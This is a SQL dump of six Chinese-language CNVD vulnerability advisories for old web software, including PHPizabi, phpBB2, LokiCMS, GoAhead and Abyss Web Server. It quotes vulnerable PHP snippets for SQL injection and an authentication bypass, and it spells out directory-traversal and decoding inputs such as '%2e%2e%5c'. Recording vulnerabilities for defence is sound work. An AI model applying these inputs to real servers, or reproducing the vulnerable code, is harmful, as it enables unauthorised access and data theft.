"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('PHPizabi notepad_body参数SQL注入漏洞', 'CNVD-2009-1753', '2009-03-24', '高   (AV:N/AC:L/Au:N/C:C/I:N/A:N)', '(暂无)', '34223', '', 'PHPizabi是一款代码开源的在线交友、交流、婚介、商务合作系统。PHPizabi的/theme/default/proc.inc.php模块中没有正确地验证用户所提交的notepad_body参数，远程攻击者可以通过提交恶意的查询请求执行SQL注入攻击。以下是有漏洞的代码段：&lt;?php    function bufferProcParse($buffer) {        global $CONF;                $tpl = new template;        $tpl -&gt; LoadThis($buffer);        // HANDLE POSTED NOTEPAD DATA \///////////////////////////////////////////////////////  if \(isset($_GET[&quot;notepad_body&quot;])) {  myQ(&quot;UPDATE `[x]users` SET `notepad_body` = \\'&quot;.urldecode($_GET[&quot;notepad_body&quot;]).&quot;\' WHERE `id`=\'&quot;.me(&quot;id&quot;).&quot;\'&quot;);  me(&quot;flush&quot;);        }..', 'http://marc.info/?l=bugtraq&amp;m=123791015512629&amp;w=2', '建议：厂商补丁：Real!ty Medias--------------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.phpizabi.net/?L=home.index', '(无补丁信息)', '已验证', '2013-03-14', '2014-01-21', '2014-01-21', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('GoAhead WebServer目录管理策略可绕过漏洞', 'CNVD-2004-0169', '2004-01-19', '高', '(暂无)', '', '', 'GoAhead WebServer是一款开放源代码的嵌入式WEB服务器程序，支持Active Server Pages、嵌入式Javascript、SSL验证和加密，广泛使用在Microsoft Windows和Linux操作系统下。      GoAhead WebServer在处理部分HTTP GET请求时存在问题，远程攻击者可以利用这个漏洞绕过目录管理策略，未授权访问服务器上的资源。      GoAhead WebServer存在一个内部问题，它可以接收不以斜杠开头或包含反斜杠(\'\\'或\'%5c\')的请求，如服务程序接收正确的&quot;GET /file HTTP/1.0&quot;请求，也接收&quot;GET file HTTP/1.0&quot;或&quot;GET \file HTTP/1.0&quot;, &quot;GET /\\%5cfile HTTP/1.0&quot;等请求，因此可绕过一些特殊的目录限制管理，未授权访问受限资源，导致敏感信息泄露。', '', 'GoAhead Software  ----------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.goahead.com/webserver/webserver.htm', '(无补丁信息)', '已验证', '2004-01-19', '2004-01-19', '2004-01-19', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('phpBB2 highlight变量二次解码导致远程命令执行漏洞', 'CNVD-2004-3226', '2004-11-12', '高', '(暂无)', '', 'CVE-2004-1315', 'phpBB是一款由PHP编写的WEB论坛应用程序，支持多种数据库系统，可使用在多种Unix和Linux操作系统下。      phpBB对highlight变量不正确的二次解码导致远程攻击者可以注入PHP代码执行系统命令。      由于phpBB的URL解码会把%2527转换成%27(单引号)，并没有追加\'\\'号的，因此可以注入PHP代码执行系统命令。', '', 'phpBB Group  -----------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.phpbb.com/', '(无补丁信息)', '已验证', '2004-11-12', '2004-11-12', '2004-11-12', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('LokiCMS admin.php文件绕过安全限制漏洞', 'CNVD-2008-2688', '2008-05-31', '高', '(暂无)', '', '', 'LokiCMS是一款简单易用的网络内容管理系统。      LokiCMS的admin.php文件中存在逻辑错误，如果远程攻击者在所提交的HTTP POST请求中设置了LokiACTION和其他参数的话，则无需管理权限就可以设置CMS main settings。      以下是有漏洞的代码段：      # admin.php Lines:24-42   if ( isset ( $_POST ) &amp;&amp; isset ( $_POST[\'LokiACTION\'] ) &amp;&amp; strlen ( trim ( $_POST[\'LokiACTION\'] )   ) &gt; 0 ) {   // we have an action to do   switch ( trim ( $_POST[\'LokiACTION\'] ) ) {   case \'A_LOGOUT\': // Logout   unset($_SESSION[PATH]);   break;      case \'A_LOGIN\': // Login   if ( isset ( $_POST[\'login\'] ) &amp;&amp; sha1 ( $_POST[\'login\'] ) == $c_password )   $_SESSION[PATH] = \'logged in lokicms030\';   break;      case \'A_SAVE_G_SETTINGS\': //save main settings   writeconfig ( $c_password, $_POST[\'title\'], $_POST[\'header\'], $_POST[\'tagline\'],   $_POST[\'footnote\'], $c_default, $_POST[\'theme\'], $_POST[\'language\'], $_POST[\'modrewrite\'],   $_POST[\'simplelink\'], $_POST[\'code\'] );   $c_theme = $_POST[\'theme\'];   include PATH . \'/includes/Config.php\';   include PATH . \'/languages/\' . $c_lang . \'.lang.php\';   $msg = $lang [\'admin\'] [\'expressionSettingsSaved\'];   break;      # includes/Functions.php Lines:163-200   function writeconfig ( $c_password, $c_title, $c_header, $c_tagline, $c_footnote, $c_default,   $c_theme, $c_lang, $c_modrewrite, $c_simplelink, $c_code )   {   .   .   .    $config = \'&amp;lt;?php \' . LINEBREAK;   $config .= \'// LokiCMS Config file, You can change settings in this file or via admin.php \' .   LINEBREAK;   $config .= \'$c_password = \\'\' . $c_password . \'\\'; \' . LINEBREAK;   $config .= \'$c_title = \\'\' . $c_title . \'\\'; \' . LINEBREAK;   $config .= \'$c_header = \\'\' . $c_header . \'\\'; \' . LINEBREAK;   $config .= \'$c_tagline = \\'\' . $c_tagline . \'\\'; \' . LINEBREAK;   $config .= \'$c_footnote = \\'\' . $c_footnote . \'\\'; \' . LINEBREAK;   $config .= \'$c_default = \\'\' . $c_default . \'\\'; \' . LINEBREAK;   $config .= \'$c_theme = \\'\' . $c_theme . \'\\'; \' . LINEBREAK;   $config .= \'$c_lang = \\'\' . $c_lang . \'\\'; \' . LINEBREAK;   $config .= \'$c_modrewrite = \' . $c_modrewrite . \'; \' . LINEBREAK;   $config .= \'$c_simplelink = \' . $c_simplelink . \'; \' . LINEBREAK;   $config .= \'$c_code = \' . $c_code . \'; \' . LINEBREAK;   $config .= \'?&gt;\';      $handle = fopen ( \'includes/Config.php\', \'w\' );   fwrite ( $handle, $config );   fclose ( $handle );   }', '', 'LokiCMS  -------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.lokicms.com/', '(无补丁信息)', '(暂无验证信息)', '2008-05-31', '2008-05-31', '2008-05-31', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('WebServer 4 Everyone远程目录遍历漏洞', 'CNVD-2002-3516', '2002-09-05', '高', '(暂无)', '', '', 'WebServer 4 Everyone是一款使用在Win32系统上的商业Web服务器程序。      WebServer 4 Everyone对用户提交的URI请求缺少正确检查，远程攻击者可以利用这个漏洞进行目录遍历攻击。      WebServer 4 Everyone对URI中由Unicode编码方式的\'\\'字符缺少正确过滤，远程攻击者可以提交包含多个\'%5c\'字符的URI请求，而导致以WEB服务进程权限查看系统上任意文件内容。', '', 'www.freeware.lt  ---------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.freeware.lt', '(无补丁信息)', '已验证', '2002-09-05', '2002-09-05', '2002-09-08', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Abyss Web服务器远程目录遍历漏洞', 'CNVD-2002-3449', '2002-08-22', '高', '(暂无)', '', 'CVE-2002-1079', 'Abyss Web Server是一款由Aprelium Technologies开发和维护的Web服务器。      Abyss Web Server实现上存在输入验证漏洞，远程攻击者可以利用此漏洞进行目录遍历攻击，读取任意有权限读取的文件。      Abyss Web Server没有正确检查反斜杠\'\\'(编码为\'%5c\')，远程攻击者可能利用URL编码\'%2e%2e%5c\'来进行目录遍历攻击，任意系统文件可能被攻击者读取。在不同的环境，得到效果不同。', '', 'Aprelium Technologies  ---------------------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：      Aprelium Technologies Patch abyssws.exe   http://www.aprelium.com/data/patch1033/abyssws.exe   Windows patch.Aprelium Technologies Patch abyssws   http://www.aprelium.com/data/patch1033/abyssws', '(无补丁信息)', '已验证', '2002-08-22', '2002-08-22', '2002-08-27', '(无附件)')"
------------------------
